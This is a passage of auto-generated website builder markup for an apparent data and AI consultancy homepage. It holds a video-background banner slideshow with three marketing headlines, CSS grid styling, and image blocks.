&quot;videoSourceProvider&quot;: &quot;native&quot;
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;none&quot;
},
&quot;divider&quot;: {
&quot;enabled&quot;: false
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation data-json-schema-section>
                <div className="section-border">
                  <div className="section-background">
                    <div data-controller="VideoBackgroundNative">
                      <div className="sqs-video-background-native content-fill" data-config-native-video="{
&quot;id&quot;: &quot;64ff73df7ae25642cca9d9b2&quot;,
&quot;recordType&quot;: 61,
&quot;addedOn&quot;: 1694462943042,
&quot;updatedOn&quot;: 1694462943042,
&quot;authorId&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;systemDataId&quot;: &quot;53984056-b42a-405a-bb84-bfe63a92d1a7&quot;,
&quot;systemDataVariants&quot;: &quot;1920:1080,640:360&quot;,
&quot;systemDataSourceType&quot;: &quot;mp4&quot;,
&quot;filename&quot;: &quot;GettyImages-1309665505.mov&quot;,
&quot;body&quot;: null,
&quot;likeCount&quot;: 0,
&quot;commentCount&quot;: 0,
&quot;publicCommentCount&quot;: 0,
&quot;commentState&quot;: 1,
&quot;author&quot;: {
&quot;id&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;displayName&quot;: &quot;Samantha Hickey&quot;,
&quot;firstName&quot;: &quot;Samantha&quot;,
&quot;lastName&quot;: &quot;Hickey&quot;,
&quot;avatarUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;,
&quot;websiteUrl&quot;: &quot;http://www.bluecoralcreative.com&quot;,
&quot;bio&quot;: &quot;&quot;,
&quot;avatarAssetUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;
},
&quot;contentType&quot;: &quot;video/mp4&quot;,
&quot;structuredContent&quot;: {
&quot;_type&quot;: &quot;SqspHostedVideo&quot;,
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333
},
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333,
&quot;items&quot;: [ ],
&quot;pushedServices&quot;: { },
&quot;pendingPushedServices&quot;: { },
&quot;usageId&quot;: &quot;04c452fc-65d0-3e13-af78-9aab741ddd5b&quot;,
&quot;recordTypeLabel&quot;: &quot;sqsp-hosted-video&quot;,
&quot;originalSize&quot;: &quot;1920:1080&quot;
}" data-config-playback-speed data-config-filter={6} data-config-filter-strength={35}>
                        <div className="sqs-video-background-native__video-player" />
                      </div>
                    </div>
                  </div>
                </div>
                <div className="content-wrapper" style={{}}>
                  <div className="content">
                    <div className="user-items-list" style={{minHeight: '100px', paddingTop: '0vmax', paddingBottom: '0vmax'}} data-card-theme data-section-id="user-items-list" data-section-title-enabled="false" data-space-below-section-title-value={120} data-space-below-section-title-unit="px" data-layout-width="full-bleed">
                      <style dangerouslySetInnerHTML={{__html: ".user-items-list-item-container[data-section-id=\"64ff72edf8a4d36581357db3\"] .list-item-content__title {\n    font-size: 3.3rem;\n  }\n  .user-items-list-item-container[data-section-id=\"64ff72edf8a4d36581357db3\"] .list-item-content__description {\n    font-size: 1.4rem;\n  }\n  .user-items-list-item-container[data-section-id=\"64ff72edf8a4d36581357db3\"] .list-item-content__button {\n    font-size: 1.1rem;\n  }\n\n  @supports (--test-custom-property: true) {\n    .user-items-list-item-container[data-section-id=\"64ff72edf8a4d36581357db3\"] {\n      --title-font-size-value: 3.3;\n      --body-font-size-value: 1.4;\n      --button-font-size-value: 1.1;\n    }\n  }\n" }} />
                      <div className="
    user-items-list-item-container
    user-items-list-banner-slideshow
  " data-controller="UserItemsListBannerSlideshow" data-progress-indicators-placement data-is-infinite-enabled="true" data-is-card-enabled="false" data-title-alignment="center" data-body-alignment="center" data-button-alignment="center" data-show-adjacent-slides="false" data-card-vertical-position="middle" data-card-horizontal-position="center" data-navigation-controls="arrows" data-navigation-placement="center" data-navigation-alignment="center" data-space-between-slides-value={0} data-space-between-slides-unit="px" data-section-id="64ff72edf8a4d36581357db3" data-current-context="{
&quot;userItems&quot;: [ {
&quot;title&quot;: &quot;Unlock the full potential of your Data Cloud&quot;,
&quot;description&quot;: &quot;Description goes here&quot;,
&quot;button&quot;: {
&quot;buttonText&quot;: &quot;Click Here&quot;,
&quot;buttonLink&quot;: &quot;/&quot;
},
&quot;image&quot;: null
}, {
&quot;title&quot;: &quot;Is your data ready to leverage AI, ML, and LLM?&quot;,
&quot;description&quot;: &quot;<p class=\&quot;\&quot; style=\&quot;white-space:pre-wrap;\&quot;>It all begins with an idea. Maybe you want to launch a business. Maybe you want to turn a hobby into something more. Or maybe you have a creative project to share with the world. Whatever it is, the way you tell your story online can make all the difference. <\/p><p class=\&quot;\&quot; data-rte-preserve-empty=\&quot;true\&quot; style=\&quot;white-space:pre-wrap;\&quot;><\/p>&quot;,
&quot;button&quot;: {
&quot;buttonText&quot;: &quot;&quot;,
&quot;buttonLink&quot;: &quot;&quot;
},
&quot;image&quot;: null
}, {
&quot;title&quot;: &quot;Make your Data Strategy your AI Strategy&quot;,
&quot;description&quot;: &quot;Description goes here&quot;,
&quot;button&quot;: {
&quot;buttonText&quot;: &quot;Click Here&quot;,
&quot;buttonLink&quot;: &quot;/&quot;
},
&quot;image&quot;: null
} ],
&quot;styles&quot;: {
&quot;imageFocalPoint&quot;: {
&quot;x&quot;: 0.5,
&quot;y&quot;: 0.5
},
&quot;imageOverlayOpacity&quot;: 0.3,
&quot;backgroundColor&quot;: &quot;white&quot;,
&quot;sectionTheme&quot;: &quot;bright&quot;,
&quot;imageEffect&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;video&quot;,
&quot;backgroundImage&quot;: null
},
&quot;video&quot;: {
&quot;filter&quot;: 6,
&quot;assetContentItemId&quot;: &quot;64ff73df7ae25642cca9d9b2&quot;,
&quot;filterStrength&quot;: 35,
&quot;videoFallbackContentItem&quot;: null,
&quot;nativeVideoContentItem&quot;: {
&quot;id&quot;: &quot;64ff73df7ae25642cca9d9b2&quot;,
&quot;recordType&quot;: 61,
&quot;addedOn&quot;: 1694462943042,
&quot;updatedOn&quot;: 1694462943042,
&quot;authorId&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;systemDataId&quot;: &quot;53984056-b42a-405a-bb84-bfe63a92d1a7&quot;,
&quot;systemDataVariants&quot;: &quot;1920:1080,640:360&quot;,
&quot;systemDataSourceType&quot;: &quot;mp4&quot;,
&quot;filename&quot;: &quot;GettyImages-1309665505.mov&quot;,
&quot;body&quot;: null,
&quot;likeCount&quot;: 0,
&quot;commentCount&quot;: 0,
&quot;publicCommentCount&quot;: 0,
&quot;commentState&quot;: 1,
&quot;author&quot;: {
&quot;id&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;displayName&quot;: &quot;Samantha Hickey&quot;,
&quot;firstName&quot;: &quot;Samantha&quot;,
&quot;lastName&quot;: &quot;Hickey&quot;,
&quot;avatarUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;,
&quot;websiteUrl&quot;: &quot;http://www.bluecoralcreative.com&quot;,
&quot;bio&quot;: &quot;&quot;,
&quot;avatarAssetUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;
},
&quot;contentType&quot;: &quot;video/mp4&quot;,
&quot;structuredContent&quot;: {
&quot;_type&quot;: &quot;SqspHostedVideo&quot;,
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333
},
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333,
&quot;items&quot;: [ ],
&quot;pushedServices&quot;: { },
&quot;pendingPushedServices&quot;: { },
&quot;usageId&quot;: &quot;04c452fc-65d0-3e13-af78-9aab741ddd5b&quot;,
&quot;recordTypeLabel&quot;: &quot;sqsp-hosted-video&quot;,
&quot;originalSize&quot;: &quot;1920:1080&quot;
},
&quot;videoSourceProvider&quot;: &quot;native&quot;
},
&quot;backgroundImageFocalPoint&quot;: null,
&quot;backgroundImageId&quot;: null,
&quot;options&quot;: {
&quot;isCardEnabled&quot;: false,
&quot;isShowAdjacentSlides&quot;: false,
&quot;isInfiniteEnabled&quot;: true,
&quot;slideDurationMs&quot;: 1000,
&quot;isMediaEnabled&quot;: false,
&quot;isTitleEnabled&quot;: true,
&quot;isBodyEnabled&quot;: false,
&quot;isButtonEnabled&quot;: false,
&quot;layoutWidth&quot;: &quot;full-bleed&quot;,
&quot;titleAlignment&quot;: &quot;center&quot;,
&quot;bodyAlignment&quot;: &quot;center&quot;,
&quot;buttonAlignment&quot;: &quot;center&quot;,
&quot;cardHorizontalPosition&quot;: &quot;center&quot;,
&quot;cardVerticalPosition&quot;: &quot;middle&quot;,
&quot;titleFontSize&quot;: &quot;heading-2&quot;,
&quot;bodyFontSize&quot;: &quot;paragraph-2&quot;,
&quot;buttonFontSize&quot;: &quot;button-medium&quot;,
&quot;customOptions&quot;: {
&quot;customTitleFontSize&quot;: {
&quot;value&quot;: 3.3,
&quot;unit&quot;: &quot;rem&quot;
},
&quot;customBodyFontSize&quot;: {
&quot;value&quot;: 1.4,
&quot;unit&quot;: &quot;rem&quot;
},
&quot;customButtonFontSize&quot;: {
&quot;value&quot;: 1.1,
&quot;unit&quot;: &quot;rem&quot;
}
},
&quot;minSlideHeight&quot;: {
&quot;value&quot;: 40,
&quot;unit&quot;: &quot;vh&quot;
},
&quot;verticalPaddingTop&quot;: {
&quot;value&quot;: 0,
&quot;unit&quot;: &quot;vmax&quot;
},
&quot;verticalPaddingBottom&quot;: {
&quot;value&quot;: 0,
&quot;unit&quot;: &quot;vmax&quot;
},
&quot;slideContentPaddingTop&quot;: {
&quot;value&quot;: 2,
&quot;unit&quot;: &quot;%&quot;
},
&quot;slideContentPaddingRight&quot;: {
&quot;value&quot;: 2,
&quot;unit&quot;: &quot;%&quot;
},
&quot;slideContentPaddingBottom&quot;: {
&quot;value&quot;: 2,
&quot;unit&quot;: &quot;%&quot;
},
&quot;slideContentPaddingLeft&quot;: {
&quot;value&quot;: 2,
&quot;unit&quot;: &quot;%&quot;
},
&quot;spaceBetweenSlides&quot;: {
&quot;value&quot;: 0,
&quot;unit&quot;: &quot;px&quot;
},
&quot;spaceBelowTitle&quot;: {
&quot;value&quot;: 10,
&quot;unit&quot;: &quot;%&quot;
},
&quot;spaceBelowBody&quot;: {
&quot;value&quot;: 10,
&quot;unit&quot;: &quot;%&quot;
},
&quot;cardPaddingTop&quot;: {
&quot;value&quot;: 20,
&quot;unit&quot;: &quot;px&quot;
},
&quot;cardPaddingRight&quot;: {
&quot;value&quot;: 20,
&quot;unit&quot;: &quot;px&quot;
},
&quot;cardPaddingBottom&quot;: {
&quot;value&quot;: 20,
&quot;unit&quot;: &quot;px&quot;
},
&quot;cardPaddingLeft&quot;: {
&quot;value&quot;: 20,
&quot;unit&quot;: &quot;px&quot;
},
&quot;navigationOffset&quot;: {
&quot;value&quot;: 3,
&quot;unit&quot;: &quot;vw&quot;
},
&quot;slideContentWidth&quot;: {
&quot;value&quot;: 90,
&quot;unit&quot;: &quot;%&quot;
},
&quot;navigationControls&quot;: &quot;arrows&quot;,
&quot;navigationPlacement&quot;: &quot;center&quot;,
&quot;navigationAlignment&quot;: &quot;center&quot;,
&quot;progressIndicators&quot;: &quot;bars&quot;
},
&quot;layout&quot;: &quot;banner-slideshow&quot;,
&quot;isSectionTitleEnabled&quot;: false,
&quot;sectionTitle&quot;: &quot;<p class=\&quot;\&quot; style=\&quot;white-space:pre-wrap;\&quot;>Make it stand out.<\/p>&quot;,
&quot;spaceBelowSectionTitle&quot;: {
&quot;value&quot;: 120,
&quot;unit&quot;: &quot;px&quot;
},
&quot;sectionTitleAlignment&quot;: &quot;center&quot;,
&quot;isSectionButtonEnabled&quot;: false,
&quot;sectionButton&quot;: {
&quot;buttonText&quot;: &quot;Make It&quot;,
&quot;buttonLink&quot;: &quot;#&quot;,
&quot;buttonNewWindow&quot;: false
},
&quot;sectionButtonSize&quot;: &quot;medium&quot;,
&quot;sectionButtonAlignment&quot;: &quot;center&quot;,
&quot;spaceAboveSectionButton&quot;: {
&quot;value&quot;: 120,
&quot;unit&quot;: &quot;px&quot;
}
}" data-layout-width="full-bleed" data-title-font-unit="rem" data-description-font-unit="rem" data-button-font-unit="rem" data-vertical-padding-top-value={0} data-vertical-padding-bottom-value={0} data-vertical-padding-top-unit="vmax" data-vertical-padding-bottom-unit="vmax" data-has-multiple-slides>
                        <div className="slideshow-wrapper">
                          <div className="slideshow-gutter">
                            <div className="slideshow-holder">
                              <ul className="slides" style={{minHeight: '40vh'}}>
                                <li className="
                slide
                list-item
              " style={{paddingTop: '2%', paddingRight: '2%', paddingBottom: '2%', paddingLeft: '2%'}} data-is-card-enabled="false">
                                  <div className="slide-content list-item-card-background
      " style={{width: '350px', minWidth: '90%', maxWidth: '100%'}}>
                                    <h2 className="list-item-content__title">Unlock the full potential of your Data Cloud</h2>
                                  </div>
                                </li>
                                <li className="
                slide
                list-item
              " style={{paddingTop: '2%', paddingRight: '2%', paddingBottom: '2%', paddingLeft: '2%'}} data-is-card-enabled="false">
                                  <div className="slide-content list-item-card-background
      " style={{width: '350px', minWidth: '90%', maxWidth: '100%'}}>
                                    <h2 className="list-item-content__title">Is your data ready to leverage AI, ML, and LLM?</h2>
                                  </div>
                                </li>
                                <li className="
                slide
                list-item
              " style={{paddingTop: '2%', paddingRight: '2%', paddingBottom: '2%', paddingLeft: '2%'}} data-is-card-enabled="false">
                                  <div className="slide-content list-item-card-background
      " style={{width: '350px', minWidth: '90%', maxWidth: '100%'}}>
                                    <h2 className="list-item-content__title">Make your Data Strategy your AI Strategy</h2>
                                  </div>
                                </li>
                              </ul>
                            </div>
                            <div className="desktop-arrows arrow-container arrow-container--left" style={{left: '3vw'}}>
                              <button className="
    user-items-list-banner-slideshow__arrow-button
    user-items-list-banner-slideshow__arrow-button--left
  " aria-label="
    
      Previous
    
    
  " data-animation-role="button">
                                <div className="
    user-items-list-banner-slideshow__arrow-icon-background
    user-items-list-banner-slideshow__arrow-icon-background-area
  ">
                                </div>
                                <svg className="user-items-list-banner-slideshow__arrow-icon" viewBox="0 0 44 18" xmlns="http://www.w3.org/2000/svg">
                                  <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        user-items-list-banner-slideshow__arrow-icon-path" d="M9.90649 16.96L2.1221 9.17556L9.9065 1.39116" />
                                  <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        user-items-list-banner-slideshow__arrow-icon-path" d="M42.8633 9.18125L3.37868 9.18125" />
                                </svg>
                              </button>
                            </div>
                            <div className="desktop-arrows arrow-container arrow-container--right" style={{right: '3vw'}}>
                              <button className="
    user-items-list-banner-slideshow__arrow-button
    user-items-list-banner-slideshow__arrow-button--right
  " aria-label="
    
    
      Next
    
  " data-animation-role="button">
                                <div className="
    user-items-list-banner-slideshow__arrow-icon-background
    user-items-list-banner-slideshow__arrow-icon-background-area
  ">
                                </div>
                                <svg className="user-items-list-banner-slideshow__arrow-icon" viewBox="0 0 44 18" xmlns="http://www.w3.org/2000/svg">
                                  <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        user-items-list-banner-slideshow__arrow-icon-path" d="M34.1477 1.39111L41.9321 9.17551L34.1477 16.9599" />
                                  <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        user-items-list-banner-slideshow__arrow-icon-path" d="M1.19088 9.16982H40.6755" />
                                </svg>
                              </button>
                            </div>
                          </div>
                          <div className="mobile-arrows">
                            <button className="
    mobile-arrow-button
    mobile-arrow-button--left
  " aria-label="
    
      Previous
    
    
  " data-animation-role="button">
                              <div className="
    user-items-list-banner-slideshow__arrow-icon-background
    mobile-arrow-icon-background-area
  ">
                              </div>
                              <svg className="mobile-arrow-icon" viewBox="0 0 24 14" xmlns="http://www.w3.org/2000/svg">
                                <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        mobile-arrow-icon-path" d="M7.87012 13L2.00021 7L7.87012 1" strokeWidth={2} fill="none" />
                                <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        mobile-arrow-icon-path" d="M22.9653 7L3.03948 7" strokeWidth={2} strokeLinecap="square" fill="none" />
                              </svg>
                            </button>
                            <button className="
    mobile-arrow-button
    mobile-arrow-button--right
  " aria-label="
    
    
      Next
    
  " data-animation-role="button">
                              <div className="
    user-items-list-banner-slideshow__arrow-icon-background
    mobile-arrow-icon-background-area
  ">
                              </div>
                              <svg className="mobile-arrow-icon" viewBox="0 0 24 14" xmlns="http://www.w3.org/2000/svg">
                                <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        mobile-arrow-icon-path" d="M16.1299 1L21.9998 7L16.1299 13" strokeWidth={2} fill="none" />
                                <path className="user-items-list-banner-slideshow__arrow-icon-foreground
        mobile-arrow-icon-path" d="M1.03472 7H20.9605" strokeWidth={2} strokeLinecap="square" fill="none" />
                              </svg>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <section data-test="page-section" data-section-theme="white-bold" className="page-section 
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      
      
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    white-bold" data-section-id="64f0ece04594ff35eaf362e7" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.6,
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
&quot;customSectionHeight&quot;: 40,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;white-bold&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;,
&quot;imageEffect&quot;: &quot;none&quot;
}" data-current-context="{
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0,
&quot;videoSourceProvider&quot;: &quot;none&quot;
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;parallax&quot;,
&quot;rotation&quot;: 90,
&quot;intensity&quot;: 30
},
&quot;divider&quot;: {
&quot;enabled&quot;: false
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation="none" data-fluid-engine-section style={{minHeight: '40vh'}}>
                <div className="section-border">
                  <div className="section-background">
                  </div>
                </div>
                <div className="content-wrapper" style={{paddingTop: 'calc(40vmax / 10)', paddingBottom: 'calc(40vmax / 10)'}}>
                  <div className="content">
                    <div data-fluid-engine="true"><style dangerouslySetInnerHTML={{__html: ".fe-64f0ece04594ff35eaf362e6 {\n  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 0.0px);\n  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (8 - 1)) ) / 8 );\n\n  display: grid;\n  position: relative;\n  grid-area: 1/1/-1/-1;\n  grid-template-rows: repeat(28,minmax(24px, auto));\n  grid-template-columns:\n    minmax(var(--grid-gutter), 1fr)\n    repeat(8, minmax(0, var(--cell-max-width)))\n    minmax(var(--grid-gutter), 1fr);\n  row-gap: 0.0px;\n  column-gap: 0.0px;\n}\n\n@media (min-width: 768px) {\n  .background-width--inset .fe-64f0ece04594ff35eaf362e6 {\n    --inset-padding: calc(var(--sqs-site-gutter) * 2);\n  }\n\n  .fe-64f0ece04594ff35eaf362e6 {\n    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 0.0px);\n    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (24 - 1)) ) / 24 );\n    --inset-padding: 0vw;\n\n    --row-height-scaling-factor: 0.0215;\n    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));\n\n    grid-template-rows: repeat(13,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));\n    grid-template-columns:\n      minmax(var(--grid-gutter), 1fr)\n      repeat(24, minmax(0, var(--cell-max-width)))\n      minmax(var(--grid-gutter), 1fr);\n  }\n}\n\n\n  .fe-block-yui_3_17_2_1_1694464277224_1750 {\n    grid-area: 1/2/9/8;\n    z-index: 2;\n  }\n\n  .fe-block-yui_3_17_2_1_1694464277224_1750 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-yui_3_17_2_1_1694464277224_1750 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1694464277224_1750 {\n      grid-area: 1/14/14/23;\n      z-index: 2;\n    }\n\n    .fe-block-yui_3_17_2_1_1694464277224_1750 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-yui_3_17_2_1_1694464277224_1750 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-df1240880cc31f4413f2 {\n    grid-area: 3/7/8/10;\n    z-index: 3;\n  }\n\n  .fe-block-df1240880cc31f4413f2 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-df1240880cc31f4413f2 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-df1240880cc31f4413f2 {\n      grid-area: 4/21/12/26;\n      z-index: 3;\n    }\n\n    .fe-block-df1240880cc31f4413f2 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-df1240880cc31f4413f2 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-ae0d589802342d28e814 {\n    grid-area: 10/2/29/10;\n    z-index: 1;\n  }\n\n  .fe-block-ae0d589802342d28e814 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-ae0d589802342d28e814 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-ae0d589802342d28e814 {\n      grid-area: 1/2/14/13;\n      z-index: 1;\n    }\n\n    .fe-block-ae0d589802342d28e814 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-ae0d589802342d28e814 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n" }} /><div className="fluid-engine fe-64f0ece04594ff35eaf362e6"><div className="fe-block fe-block-yui_3_17_2_1_1694464277224_1750"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-aspect-ratio="65.01227161167166" data-block-type={5} id="block-yui_3_17_2_1_1694464277224_1750"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', borderTopRightRadius: '50px', borderBottomLeftRadius: '50px', position: 'relative', width: '100%', height: '100%'}}>
                                    <div className="content-fill">
                                      <img data-stretch="true" crossOrigin data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg" data-image-dimensions="800x450" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg" width={800} height={450} sizes="100vw" style={{display: 'block', objectFit: 'cover', objectPosition: '50% 50%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=100w 100w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/05b28379-6fc0-4719-aa0b-94975fba7cf5/BoBoCayuga-Technologies-servers-neon-lines.jpg?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="imageEffectContainer" style={{position: 'absolute', inset: 0, margin: 'auto', pointerEvents: 'none'}} data-effect="{
&quot;type&quot;: &quot;parallax&quot;,
&quot;intensity&quot;: 20,
&quot;rotation&quot;: 45,
&quot;zoomStart&quot;: 0,
&quot;zoomEnd&quot;: 0
}" />
                                      <div className="fluidImageOverlay" />
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-yui_3_17_2_1_1694464277224_1750 .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-df1240880cc31f4413f2"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-aspect-ratio="65.01227161167166" data-block-type={5} id="block-df1240880cc31f4413f2"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', borderTopRightRadius: '50px', borderBottomLeftRadius: '50px', position: 'relative', width: '100%', height: '100%'}}>
                                    <div className="content-fill">
